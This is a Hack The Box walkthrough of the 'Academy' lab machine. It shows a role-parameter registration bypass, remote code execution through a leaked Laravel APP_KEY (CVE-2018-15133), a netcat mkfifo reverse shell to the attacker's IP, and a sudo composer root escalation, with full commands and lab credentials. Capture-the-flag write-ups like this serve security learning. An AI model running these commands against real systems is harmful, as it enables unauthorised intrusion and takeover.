---
title:  "Hack The Box - Academy"
categories: [Laravel, Broken Authentication, cve-2018-15133, Composer]
tags: [Hackthebox, Infosec, Linux]
imageid: /assets/images/Academy/cover.png
---

![](/assets/images/Academy/cover.png)

## Portscan
---

```sql
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http?
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconaissance
---
like usual im gonna use whatweb command for definition a site

> whatweb http://$ip

```
http://10.10.10.215 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], RedirectLocation[http://academy.htb/]
http://academy.htb/ [302 Found] Country[INDONESIA][ID], HTTPServer[BigIP], IP[36.86.63.182], RedirectLocation[http://mercusuar.uzone.id]
http://mercusuar.uzone.id [200 OK] Bootstrap, Country[INDONESIA][ID], Frame, HTML5, HTTPServer[nginx], IP[36.86.63.180], JQuery[2.2.4], PHP[5.6.40], Script[text/javascript], Title[Mercusuar], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-Powered-By[PHP/5.6.40], X-XSS-Protection[1; mode=block], YouTube, nginx
```

as you can see we got new domain, added into host file then access it.

> http://academy.htb/

![](/assets/images/Academy/1.png)

found login.php and register.php

> http://academy.htb/login.php

![](/assets/images/Academy/2.png)


> http://academy.htb/register.php

![](/assets/images/Academy/3.png)

tried register and login with my account

```bash
unknown:1
```

![](/assets/images/Academy/4.png)

as you can see i able to login, but that is something wronng im not login as unkwon but egre55 as creator.

im gonna doing scanning directory for finding something important using dirb.

> dirb http://academy.htb/

![](/assets/images/Academy/9.png)

i found admin.php for admin panel, the mystakes is on register page.

here's my assumtion this site using role like if role = 0 you can register as user but if you register role = 1 you can login as admin.
it's clearly when im check the source code on register.php

![](/assets/images/Academy/5.png)

so im back again on register.php for register as admin with role 1, you doing this with burpsuite or developer tools then login on admin page as admin with password 1

![](/assets/images/Academy/6.png)

> http://academy.htb/admin-page.php

![](/assets/images/Academy/7.png)

as you can see i logged as admin! YAY!

now i've got new subdomain again , added into host file

```
Fix issue with dev-staging-01.academy.htb
```

> http://dev-staging-01.academy.htb/

![](/assets/images/Academy/8.png)

this site based on laravel XD... similiar error

this error telling us crutial information

```php
APP_NAME 	
"Laravel"

APP_ENV 	
"local"

APP_KEY 	
"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
```

im googling about this APP key for laravel and found this [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) and poc code in [here](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

we can easily to exploit as long as we have app key

`python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c pwd`

![](/assets/images/Academy/10.png)

nice RCE , now it's time to revershell

`python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.128 9000 >/tmp/f'`

and start listner

`rlwrap nc -lnvp 9000`

![](/assets/images/Academy/11.png)

upgrade shell with following command :

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

i found user.txt on dir /home/cry0l1t3, for password carolite i found that in /var/www/html/academy/.env this file contains information about the site.

![](/assets/images/Academy/13.png)

```bash
mySup3rP4s5w0rd!!
```

login via ssh for stable shell and grab user.txt

![](/assets/images/Academy/15.png)

there is no sudo -l command with this user, and already check the os using command lsb_release with newest os until linpeas.sh show me the way
 
![](/assets/images/Academy/16.png)

`su mrb3n:mrb3n_Ac@d3my!`


## Privilege Escalation
---
for mrb3n user we can run command sudo -l for gain root access 


`sudo -l`

![](/assets/images/Academy/17.png)

we can take advantages of composer, execute this command below will lead you into root.

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

![](/assets/images/Academy/18.png)

and grab our root.txt

![](/assets/images/Academy/19.png)

### Referencess

```console
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
https://netsec.ws/?p=337
https://gtfobins.github.io/gtfobins/composer/
```